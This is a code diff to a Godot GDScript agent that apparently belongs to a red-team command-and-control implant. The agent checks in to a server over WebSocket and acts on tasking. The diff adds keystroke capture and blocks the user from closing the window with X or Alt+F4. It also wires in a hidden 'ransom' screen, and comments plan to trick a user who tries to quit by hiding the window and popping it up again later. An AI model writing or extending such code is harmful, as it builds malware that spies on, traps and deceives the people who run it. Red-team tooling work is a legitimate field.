@@ -4,19 +4,31 @@ var time = 0
 var time_period = 1
 var do_exit = false
 var exiting = false
-
 var outbound = []
-
-export var websocket_url = "ws://127.0.0.1:3333/ws"
-
 var _client = WebSocketClient.new()
-
 var headers
 
 signal checkin
 signal tasking
 
+func _unhandled_input(event):
+	if event is InputEventKey:
+		if event.pressed:
+			print(event.scancode)
+
+func _notification(what):
+	if what == MainLoop.NOTIFICATION_WM_QUIT_REQUEST:
+		pass
+		# Send notification to redteam that the user is trying to close the agent?
+		# Send window to background so they think they were successful, set timer, pop-up again in a little bit?
+
 func _ready():
+	get_tree().set_auto_accept_quit(false) # Don't let users click X or alt+F4
+	get_tree().get_root().set_transparent_background(true) # transparent background?
+
+
+	$ransom.hide()
+	
 	_client.connect("connection_closed", self, "_closed")
 	_client.connect("connection_error", self, "_error")
 	_client.connect("connection_established", self, "_connected")
@@ -44,13 +56,12 @@ func _closed(was_clean = false):
 	print("Closed, clean: ", was_clean)
 	exiting = true
 
-
 func _connected(_proto = ""):
 	print("Connected!")
 
 	$CallbackTimer.start()
 
-	var ret = _client.get_peer(1).put_packet($api._get_checkin_payload())
+	var ret = _client.get_peer(1).put_packet($api.wrap_payload($api.get_checkin_payload()))
 
 	if ret != OK:
 		print("failed to send checkin")
@@ -64,7 +75,7 @@ func _on_data():
 		return
 
 	var result = $api.unwrap_payload(packet)
-	
+
 	if not result.has("action") or result["action"] == "":
 		print("Bad message unpacked? ", result)
 		return
@@ -129,7 +140,7 @@ func _on_tasking_exit(task):
 	do_exit = true
 
 	$api.agent_response(
-		$api._create_task_response(
+		$api.create_task_response(
 			true,
 			true,
 			task.get("id"),
